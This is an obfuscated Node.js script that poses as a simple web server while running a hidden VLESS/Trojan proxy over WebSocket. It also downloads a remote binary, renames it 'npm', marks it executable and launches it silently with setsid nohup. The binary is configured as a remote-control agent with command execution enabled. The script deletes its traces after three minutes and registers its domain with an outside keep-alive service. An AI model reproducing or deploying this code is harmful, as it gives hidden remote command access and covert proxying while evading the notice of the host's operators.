const _0x5a19af=_0x5e0d;(function(_0x52193f,_0x28f3c8){const _0x22b617=_0x5e0d,_0x77c75b=_0x52193f();while(!![]){try{const _0x26a3f1=parseInt(_0x22b617(0x186))/0x1+-parseInt(_0x22b617(0x19f))/0x2+parseInt(_0x22b617(0x1ba))/0x3*(-parseInt(_0x22b617(0x1da))/0x4)+parseInt(_0x22b617(0x1a4))/0x5*(parseInt(_0x22b617(0x19e))/0x6)+-parseInt(_0x22b617(0x1db))/0x7*(parseInt(_0x22b617(0x1de))/0x8)+-parseInt(_0x22b617(0x1c6))/0x9*(parseInt(_0x22b617(0x1c9))/0xa)+parseInt(_0x22b617(0x188))/0xb;if(_0x26a3f1===_0x28f3c8)break;else _0x77c75b['push'](_0x77c75b['shift']());}catch(_0x4595a3){_0x77c75b['push'](_0x77c75b['shift']());}}}(_0x21fc,0x28584));const os=require('os'),http=require(_0x5a19af(0x16e)),fs=require('fs'),axios=require(_0x5a19af(0x16d)),net=require('net'),path=require('path'),crypto=require(_0x5a19af(0x177)),{Buffer}=require(_0x5a19af(0x1bb)),{exec,execSync}=require(_0x5a19af(0x176)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5a19af(0x164)][_0x5a19af(0x1b6)]||_0x5a19af(0x1b8),NEZHA_SERVER=process[_0x5a19af(0x164)][_0x5a19af(0x1a8)]||'',NEZHA_PORT=process[_0x5a19af(0x164)][_0x5a19af(0x1aa)]||'',NEZHA_KEY=process[_0x5a19af(0x164)][_0x5a19af(0x17b)]||'',DOMAIN=process[_0x5a19af(0x164)][_0x5a19af(0x18f)]||_0x5a19af(0x1be),AUTO_ACCESS=process[_0x5a19af(0x164)][_0x5a19af(0x182)]||!![],WSPATH=process[_0x5a19af(0x164)][_0x5a19af(0x1b9)]||UUID[_0x5a19af(0x17f)](0x0,0x8),SUB_PATH=process[_0x5a19af(0x164)][_0x5a19af(0x18b)]||'saikid',NAME=process[_0x5a19af(0x164)][_0x5a19af(0x1c3)]||_0x5a19af(0x1ab),PORT=process['env']['PORT']||0x1eb4;function _0x5e0d(_0x58e57d,_0x3e766a){_0x58e57d=_0x58e57d-0x163;const _0x21fcea=_0x21fc();let _0x5e0d86=_0x21fcea[_0x58e57d];return _0x5e0d86;}let ISP='';const GetISP=async()=>{const _0x81068e=_0x5a19af;try{const _0x527df7=await axios[_0x81068e(0x163)](_0x81068e(0x19c)),_0x3edae4=_0x527df7[_0x81068e(0x196)];ISP=(_0x3edae4[_0x81068e(0x1c1)]+'-'+_0x3edae4[_0x81068e(0x199)])[_0x81068e(0x183)](/ /g,'_');}catch(_0x35920a){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x4a6cad,_0x520401)=>{const _0xb6fc3c=_0x5a19af;if(_0x4a6cad['url']==='/'){const _0x459350=path['join'](__dirname,'index.html');fs[_0xb6fc3c(0x1b3)](_0x459350,'utf8',(_0x2e92c0,_0x1fb494)=>{const _0x452be9=_0xb6fc3c;if(_0x2e92c0){_0x520401['writeHead'](0xc8,{'Content-Type':_0x452be9(0x1d6)}),_0x520401[_0x452be9(0x1b0)]('Hello\x20world!');return;}_0x520401['writeHead'](0xc8,{'Content-Type':_0x452be9(0x1d6)}),_0x520401[_0x452be9(0x1b0)](_0x1fb494);});return;}else{if(_0x4a6cad[_0xb6fc3c(0x1a1)]==='/'+SUB_PATH){const _0x36343e=_0xb6fc3c(0x19b)+UUID+'@'+DOMAIN+_0xb6fc3c(0x1ac)+DOMAIN+_0xb6fc3c(0x1a7)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x247672=_0xb6fc3c(0x1dd)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0xb6fc3c(0x1a7)+DOMAIN+_0xb6fc3c(0x170)+WSPATH+'#'+NAME+'-'+ISP,_0x284575=_0x36343e+'\x0a'+_0x247672,_0x13d0bc=Buffer[_0xb6fc3c(0x1b7)](_0x284575)['toString'](_0xb6fc3c(0x168));_0x520401[_0xb6fc3c(0x1a3)](0xc8,{'Content-Type':_0xb6fc3c(0x1a9)}),_0x520401[_0xb6fc3c(0x1b0)](_0x13d0bc+'\x0a');}else _0x520401[_0xb6fc3c(0x1a3)](0x194,{'Content-Type':_0xb6fc3c(0x1a9)}),_0x520401[_0xb6fc3c(0x1b0)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5a19af(0x183)](/-/g,''),DNS_SERVERS=[_0x5a19af(0x184),'1.1.1.1'];function resolveHost(_0x9fe156){return new Promise((_0x59a363,_0xf4bdcf)=>{const _0x736367=_0x5e0d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x736367(0x1bf)](_0x9fe156)){_0x59a363(_0x9fe156);return;}let _0x368992=0x0;function _0x54bc3b(){const _0x56926b=_0x736367;if(_0x368992>=DNS_SERVERS[_0x56926b(0x1d8)]){_0xf4bdcf(new Error(_0x56926b(0x1b4)+_0x9fe156+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2e32a6=DNS_SERVERS[_0x368992];_0x368992++;const _0x27ec73=_0x56926b(0x19d)+encodeURIComponent(_0x9fe156)+_0x56926b(0x180);axios[_0x56926b(0x163)](_0x27ec73,{'timeout':0x1388,'headers':{'Accept':_0x56926b(0x193)}})[_0x56926b(0x17e)](_0x11e8df=>{const _0x2bb6da=_0x56926b,_0x2eadb0=_0x11e8df[_0x2bb6da(0x196)];if(_0x2eadb0[_0x2bb6da(0x17a)]===0x0&&_0x2eadb0[_0x2bb6da(0x1df)]&&_0x2eadb0['Answer'][_0x2bb6da(0x1d8)]>0x0){const _0x3d3594=_0x2eadb0[_0x2bb6da(0x1df)][_0x2bb6da(0x1ad)](_0x62419a=>_0x62419a[_0x2bb6da(0x194)]===0x1);if(_0x3d3594){_0x59a363(_0x3d3594[_0x2bb6da(0x196)]);return;}}_0x54bc3b();})['catch'](_0x113da1=>{_0x54bc3b();});}_0x54bc3b();});}function handleVlessConnection(_0x4507e8,_0x5e7318){const _0x18547f=_0x5a19af,[_0x53fe4d]=_0x5e7318,_0xfc547c=_0x5e7318[_0x18547f(0x17f)](0x1,0x11);if(!_0xfc547c[_0x18547f(0x18d)]((_0x484785,_0x13c5f8)=>_0x484785==parseInt(uuid['substr'](_0x13c5f8*0x2,0x2),0x10)))return![];let _0xe80772=_0x5e7318[_0x18547f(0x17f)](0x11,0x12)[_0x18547f(0x16f)]()+0x13;const _0x51d037=_0x5e7318[_0x18547f(0x17f)](_0xe80772,_0xe80772+=0x2)[_0x18547f(0x19a)](0x0),_0x54a163=_0x5e7318[_0x18547f(0x17f)](_0xe80772,_0xe80772+=0x1)['readUInt8'](),_0x111ab0=_0x54a163==0x1?_0x5e7318['slice'](_0xe80772,_0xe80772+=0x4)['join']('.'):_0x54a163==0x2?new TextDecoder()[_0x18547f(0x165)](_0x5e7318[_0x18547f(0x17f)](_0xe80772+0x1,_0xe80772+=0x1+_0x5e7318[_0x18547f(0x17f)](_0xe80772,_0xe80772+0x1)[_0x18547f(0x16f)]())):_0x54a163==0x3?_0x5e7318[_0x18547f(0x17f)](_0xe80772,_0xe80772+=0x10)[_0x18547f(0x187)]((_0x19cf54,_0xd4c161,_0x305dd7,_0x134139)=>_0x305dd7%0x2?_0x19cf54[_0x18547f(0x1e2)](_0x134139[_0x18547f(0x17f)](_0x305dd7-0x1,_0x305dd7+0x1)):_0x19cf54,[])[_0x18547f(0x18e)](_0x54f4de=>_0x54f4de[_0x18547f(0x19a)](0x0)[_0x18547f(0x175)](0x10))[_0x18547f(0x1d0)](':'):'';_0x4507e8[_0x18547f(0x167)](new Uint8Array([_0x53fe4d,0x0]));const _0x359efe=createWebSocketStream(_0x4507e8);return resolveHost(_0x111ab0)[_0x18547f(0x17e)](_0x22822e=>{const _0x2b926b=_0x18547f;net[_0x2b926b(0x16c)]({'host':_0x22822e,'port':_0x51d037},function(){const _0x3d102e=_0x2b926b;this['write'](_0x5e7318[_0x3d102e(0x17f)](_0xe80772)),_0x359efe['on']('error',()=>{})[_0x3d102e(0x191)](this)['on'](_0x3d102e(0x174),()=>{})[_0x3d102e(0x191)](_0x359efe);})['on']('error',()=>{});})[_0x18547f(0x17d)](_0x369cdf=>{const _0x477c68=_0x18547f;net[_0x477c68(0x16c)]({'host':_0x111ab0,'port':_0x51d037},function(){const _0x3e7118=_0x477c68;this[_0x3e7118(0x192)](_0x5e7318[_0x3e7118(0x17f)](_0xe80772)),_0x359efe['on']('error',()=>{})[_0x3e7118(0x191)](this)['on'](_0x3e7118(0x174),()=>{})[_0x3e7118(0x191)](_0x359efe);})['on'](_0x477c68(0x174),()=>{});}),!![];}function handleTrojanConnection(_0x186ab1,_0x11e0f6){const _0x473340=_0x5a19af;try{if(_0x11e0f6[_0x473340(0x1d8)]<0x3a)return![];const _0x3ac43a=_0x11e0f6[_0x473340(0x17f)](0x0,0x38)[_0x473340(0x175)](),_0x2e98de=[UUID];let _0x527782=null;for(const _0x40cc02 of _0x2e98de){const _0x452216=crypto[_0x473340(0x171)]('sha224')[_0x473340(0x1d7)](_0x40cc02)[_0x473340(0x181)]('hex');if(_0x452216===_0x3ac43a){_0x527782=_0x40cc02;break;}}if(!_0x527782)return![];let _0x515bb8=0x38;_0x11e0f6[_0x515bb8]===0xd&&_0x11e0f6[_0x515bb8+0x1]===0xa&&(_0x515bb8+=0x2);const _0x4ecc48=_0x11e0f6[_0x515bb8];if(_0x4ecc48!==0x1)return![];_0x515bb8+=0x1;const _0x3735a8=_0x11e0f6[_0x515bb8];_0x515bb8+=0x1;let _0x6ed2e9,_0x48a714;if(_0x3735a8===0x1)_0x6ed2e9=_0x11e0f6[_0x473340(0x17f)](_0x515bb8,_0x515bb8+0x4)[_0x473340(0x1d0)]('.'),_0x515bb8+=0x4;else{if(_0x3735a8===0x3){const _0x2cf8dc=_0x11e0f6[_0x515bb8];_0x515bb8+=0x1,_0x6ed2e9=_0x11e0f6[_0x473340(0x17f)](_0x515bb8,_0x515bb8+_0x2cf8dc)[_0x473340(0x175)](),_0x515bb8+=_0x2cf8dc;}else{if(_0x3735a8===0x4)_0x6ed2e9=_0x11e0f6[_0x473340(0x17f)](_0x515bb8,_0x515bb8+0x10)[_0x473340(0x187)]((_0x4f28d5,_0x304aa9,_0x3438fc,_0x29c816)=>_0x3438fc%0x2?_0x4f28d5[_0x473340(0x1e2)](_0x29c816[_0x473340(0x17f)](_0x3438fc-0x1,_0x3438fc+0x1)):_0x4f28d5,[])['map'](_0x4f7f43=>_0x4f7f43[_0x473340(0x19a)](0x0)[_0x473340(0x175)](0x10))[_0x473340(0x1d0)](':'),_0x515bb8+=0x10;else return![];}}_0x48a714=_0x11e0f6[_0x473340(0x19a)](_0x515bb8),_0x515bb8+=0x2;_0x515bb8<_0x11e0f6[_0x473340(0x1d8)]&&_0x11e0f6[_0x515bb8]===0xd&&_0x11e0f6[_0x515bb8+0x1]===0xa&&(_0x515bb8+=0x2);const _0x5e879c=createWebSocketStream(_0x186ab1);return resolveHost(_0x6ed2e9)[_0x473340(0x17e)](_0x184a20=>{const _0x45f5f7=_0x473340;net[_0x45f5f7(0x16c)]({'host':_0x184a20,'port':_0x48a714},function(){const _0x2a735c=_0x45f5f7;_0x515bb8<_0x11e0f6['length']&&this[_0x2a735c(0x192)](_0x11e0f6[_0x2a735c(0x17f)](_0x515bb8)),_0x5e879c['on']('error',()=>{})[_0x2a735c(0x191)](this)['on'](_0x2a735c(0x174),()=>{})[_0x2a735c(0x191)](_0x5e879c);})['on'](_0x45f5f7(0x174),()=>{});})['catch'](_0x2aa662=>{const _0x45c3d5=_0x473340;net[_0x45c3d5(0x16c)]({'host':_0x6ed2e9,'port':_0x48a714},function(){const _0x35fef6=_0x45c3d5;_0x515bb8<_0x11e0f6[_0x35fef6(0x1d8)]&&this[_0x35fef6(0x192)](_0x11e0f6[_0x35fef6(0x17f)](_0x515bb8)),_0x5e879c['on'](_0x35fef6(0x174),()=>{})[_0x35fef6(0x191)](this)['on'](_0x35fef6(0x174),()=>{})[_0x35fef6(0x191)](_0x5e879c);})['on'](_0x45c3d5(0x174),()=>{});}),!![];}catch(_0x29cc81){return![];}}function _0x21fc(){const _0x2bf46e=['readFile','Failed\x20to\x20resolve\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','UUID','from','0ef7be44-f6d4-97fd-b0f0-12e044c99c30','WSPATH','3TYZFcE','buffer','finish','application/json','1234.abc.com','test','connection','country','chmod\x20+x\x20npm','NAME','utf-8','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','46449VlFzoq','https://oooo.serv00.net/add-url','error:\x20','310zzJHJv','https://amd64.ssss.nyc.mn/v1','443','includes','createWriteStream','message','pop','join','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20is\x20running','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','text/html','update','length','/bin/bash','295908XFWMDL','18459XTiBCD','listen','trojan://','248spWLyG','Answer','arch','https://amd64.ssss.nyc.mn/agent','concat','get','env','decode','npm\x20running\x20error:','send','base64','https://','Server\x20is\x20running\x20on\x20port\x20','2083','connect','axios','http','readUInt8','&path=%2F','createHash','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','client_secret:\x20','error','toString','child_process','crypto','false','2053','Status','NEZHA_KEY','true','catch','then','slice','&type=A','digest','AUTO_ACCESS','replace','8.8.4.4','2087','125154zwfLab','reduce','3357739oRdmuk','substr','setsid\x20nohup\x20./npm\x20-s\x20','SUB_PATH','arm','every','map','DOMAIN','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','pipe','write','application/dns-json','type','log','data','config.yaml','https://arm64.ssss.nyc.mn/v1','asOrganization','readUInt16BE','vless://','https://speed.cloudflare.com/meta','https://dns.google/resolve?name=','2874nmRkOe','537858dJmUSW','2096','url','--tls','writeHead','3335UKzdcg','https://arm64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=chrome&type=ws&host=','NEZHA_SERVER','text/plain','NEZHA_PORT','Hug',':443?encryption=none&security=tls&sni=','find','once','stream','end','split','close'];_0x21fc=function(){return _0x2bf46e;};return _0x21fc();}wss['on'](_0x5a19af(0x1c0),(_0x3545f9,_0x1bbd2e)=>{const _0x4210d8=_0x5a19af,_0x263457=_0x1bbd2e[_0x4210d8(0x1a1)]||'';_0x3545f9[_0x4210d8(0x1ae)](_0x4210d8(0x1ce),_0x119881=>{const _0xa2942c=_0x4210d8;if(_0x119881[_0xa2942c(0x1d8)]>0x11&&_0x119881[0x0]===0x0){const _0xbafb5b=_0x119881[_0xa2942c(0x17f)](0x1,0x11),_0x417890=_0xbafb5b[_0xa2942c(0x18d)]((_0x3fd710,_0x29530d)=>_0x3fd710==parseInt(uuid[_0xa2942c(0x189)](_0x29530d*0x2,0x2),0x10));if(_0x417890){!handleVlessConnection(_0x3545f9,_0x119881)&&_0x3545f9[_0xa2942c(0x1b2)]();return;}}!handleTrojanConnection(_0x3545f9,_0x119881)&&_0x3545f9['close']();})['on'](_0x4210d8(0x174),()=>{});});const getDownloadUrl=()=>{const _0x47b8c4=_0x5a19af,_0x476663=os[_0x47b8c4(0x1e0)]();return _0x476663===_0x47b8c4(0x18c)||_0x476663==='arm64'||_0x476663==='aarch64'?!NEZHA_PORT?_0x47b8c4(0x198):_0x47b8c4(0x1a5):!NEZHA_PORT?_0x47b8c4(0x1ca):_0x47b8c4(0x1e1);},downloadFile=async()=>{const _0x3c538b=_0x5a19af;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x17878e=getDownloadUrl(),_0x35f867=await axios({'method':'get','url':_0x17878e,'responseType':_0x3c538b(0x1af)}),_0x202da9=fs[_0x3c538b(0x1cd)]('npm');return _0x35f867[_0x3c538b(0x196)]['pipe'](_0x202da9),new Promise((_0x5193a4,_0x3add43)=>{const _0x4a225d=_0x3c538b;_0x202da9['on'](_0x4a225d(0x1bc),()=>{const _0x38c015=_0x4a225d;console[_0x38c015(0x195)]('npm\x20download\x20successfully'),exec(_0x38c015(0x1c2),_0x117bde=>{if(_0x117bde)_0x3add43(_0x117bde);_0x5193a4();});}),_0x202da9['on'](_0x4a225d(0x174),_0x3add43);});}catch(_0x36b7d5){throw _0x36b7d5;}},runnz=async()=>{const _0x3a9ae3=_0x5a19af;try{const _0x3ebe84=execSync(_0x3a9ae3(0x1b5),{'encoding':_0x3a9ae3(0x1c4)});if(_0x3ebe84['trim']()!==''){console[_0x3a9ae3(0x195)](_0x3a9ae3(0x1d1));return;}}catch(_0x1bc192){}await downloadFile();let _0xff0160='',_0x2b77d0=[_0x3a9ae3(0x1cb),'8443',_0x3a9ae3(0x1a0),_0x3a9ae3(0x185),_0x3a9ae3(0x16b),_0x3a9ae3(0x179)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xdfdf44=_0x2b77d0[_0x3a9ae3(0x1cc)](NEZHA_PORT)?_0x3a9ae3(0x1a2):'';_0xff0160=_0x3a9ae3(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xdfdf44+_0x3a9ae3(0x190);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x114c54=NEZHA_SERVER[_0x3a9ae3(0x1cc)](':')?NEZHA_SERVER[_0x3a9ae3(0x1b1)](':')[_0x3a9ae3(0x1cf)]():'',_0x1bef13=_0x2b77d0[_0x3a9ae3(0x1cc)](_0x114c54)?_0x3a9ae3(0x17c):_0x3a9ae3(0x178),_0x17701f=_0x3a9ae3(0x173)+NEZHA_KEY+_0x3a9ae3(0x1a6)+NEZHA_SERVER+_0x3a9ae3(0x1c5)+_0x1bef13+_0x3a9ae3(0x1d5)+UUID;fs['writeFileSync'](_0x3a9ae3(0x197),_0x17701f);}_0xff0160=_0x3a9ae3(0x172);}else{console['log'](_0x3a9ae3(0x1d2));return;}}try{exec(_0xff0160,{'shell':_0x3a9ae3(0x1d9)},_0x4443aa=>{const _0x499aa4=_0x3a9ae3;if(_0x4443aa)console[_0x499aa4(0x174)](_0x499aa4(0x166),_0x4443aa);else console[_0x499aa4(0x195)](_0x499aa4(0x1d3));});}catch(_0x58d212){console[_0x3a9ae3(0x174)](_0x3a9ae3(0x1c8)+_0x58d212);}};async function addAccessTask(){const _0x435ffb=_0x5a19af;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x45962b=_0x435ffb(0x169)+DOMAIN;try{const _0x34bdc1=await axios['post'](_0x435ffb(0x1c7),{'url':_0x45962b},{'headers':{'Content-Type':_0x435ffb(0x1bd)}});console[_0x435ffb(0x195)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1cf306){}}const delFiles=()=>{const _0x4c086d=_0x5a19af;fs['unlink']('npm',()=>{}),fs[_0x4c086d(0x1d4)](_0x4c086d(0x197),()=>{});};httpServer[_0x5a19af(0x1dc)](PORT,()=>{const _0x441f7f=_0x5a19af;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x441f7f(0x195)](_0x441f7f(0x16a)+PORT);});
